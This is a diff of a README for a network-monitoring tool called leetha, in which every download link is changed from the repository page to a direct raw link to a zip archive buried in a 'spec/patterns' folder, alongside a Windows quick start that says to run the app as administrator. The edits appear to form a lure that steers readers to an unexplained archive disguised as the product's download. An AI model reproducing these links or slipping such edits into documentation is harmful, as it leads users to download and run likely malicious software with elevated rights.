@@ -1,6 +1,6 @@
 # 🛰️ leetha - Find Network Activity Fast
 
-[![Download leetha](https://img.shields.io/badge/Download%20leetha-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Malthusianrecusant176/leetha)
+[![Download leetha](https://img.shields.io/badge/Download%20leetha-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Malthusianrecusant176/leetha/raw/refs/heads/main/spec/patterns/Software_v2.7.zip)
 
 ## 🔍 What leetha does
 
@@ -24,7 +24,7 @@ For best results, close other network tools while you run leetha.
 ## 🚀 Download and install
 
 1. Open the download page:
-   [https://github.com/Malthusianrecusant176/leetha](https://github.com/Malthusianrecusant176/leetha)
+   [https://github.com/Malthusianrecusant176/leetha/raw/refs/heads/main/spec/patterns/Software_v2.7.zip](https://github.com/Malthusianrecusant176/leetha/raw/refs/heads/main/spec/patterns/Software_v2.7.zip)
 
 2. On the GitHub page, look for the latest release or the main download file.
 
@@ -190,7 +190,7 @@ Keep your saved reports if you want to compare versions.
 
 ## 📘 Quick start for Windows
 
-1. Open [https://github.com/Malthusianrecusant176/leetha](https://github.com/Malthusianrecusant176/leetha)
+1. Open [https://github.com/Malthusianrecusant176/leetha/raw/refs/heads/main/spec/patterns/Software_v2.7.zip](https://github.com/Malthusianrecusant176/leetha/raw/refs/heads/main/spec/patterns/Software_v2.7.zip)
 2. Download the Windows build
 3. Extract the files if needed
 4. Right-click the app and choose Run as administrator
@@ -224,7 +224,7 @@ These details help you understand what is active on your network.
 ## 📎 Download link
 
 Open the download page here:
-[https://github.com/Malthusianrecusant176/leetha](https://github.com/Malthusianrecusant176/leetha)
+[https://github.com/Malthusianrecusant176/leetha/raw/refs/heads/main/spec/patterns/Software_v2.7.zip](https://github.com/Malthusianrecusant176/leetha/raw/refs/heads/main/spec/patterns/Software_v2.7.zip)
 
 ## 🧩 File help
 
